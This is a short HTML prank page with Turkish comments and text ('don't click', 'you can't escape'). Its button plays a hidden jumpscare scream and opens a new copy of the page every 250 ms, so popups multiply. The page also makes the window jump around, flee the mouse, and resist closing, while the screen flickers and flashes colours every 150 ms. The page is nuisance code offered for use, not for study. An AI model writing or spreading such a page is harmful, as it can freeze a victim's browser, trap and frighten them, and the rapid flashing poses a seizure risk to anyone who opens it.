<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>😈</title>

<style>
body {
    background: black;
    color: red;
    font-size: 40px;
    text-align: center;
    margin-top: 20%;
    font-family: Arial;
    animation: flicker 0.15s infinite;
}
button {
    font-size: 30px;
    padding: 20px;
    cursor: pointer;
    background: red;
    color: black;
    border: none;
}
iframe {
    display: none;
}

@keyframes flicker {
    0% { opacity: 1; }
    50% { opacity: 0.7; }
    100% { opacity: 1; }
}
</style>
</head>

<body>

<div>SAKIN TIKLAMA</div>
<button onclick="chaos()">😈</button>

<!-- MyInstants FNAF jumpscare iframe -->
<iframe
    id="soundFrame"
    src="https://www.myinstants.com/en/instant/fnaf-jumpscare-scream/"
    allow="autoplay">
</iframe>

<script>
let chaosInterval;

// Rastgele pencere açma
function chaos() {

    // iframe yeniden yüklenir → ses tetiklenir
    const frame = document.getElementById("soundFrame");
    frame.src = frame.src;

    chaosInterval = setInterval(() => {
        let w = 300;
        let h = 200;

        let x = Math.random() * (screen.availWidth - w);
        let y = Math.random() * (screen.availHeight - h);

        window.open(
            window.location.href,
            "",
            `width=${w},height=${h},left=${x},top=${y}`
        );
    }, 250);

    shakeWindow();
}

// Ana pencere titreme
function shakeWindow() {
    setInterval(() => {
        let x = Math.random() * (screen.availWidth - 400);
        let y = Math.random() * (screen.availHeight - 300);
        window.moveTo(x, y);
    }, 120);
}

// Mouse yaklaşınca kaç
document.addEventListener("mousemove", () => {
    let x = Math.random() * (screen.availWidth - 400);
    let y = Math.random() * (screen.availHeight - 300);
    window.moveTo(x, y);
});

// Kapatmaya çalışınca uyarı
window.onbeforeunload = function () {
    return "Kaçamazsın 😈";
};

// Glitch efekti
setInterval(() => {
    document.body.style.filter = `
        hue-rotate(${Math.random() * 360}deg)
        contrast(${1 + Math.random()})
        blur(${Math.random() * 2}px)
    `;
}, 150);
</script>

</body>
</html>
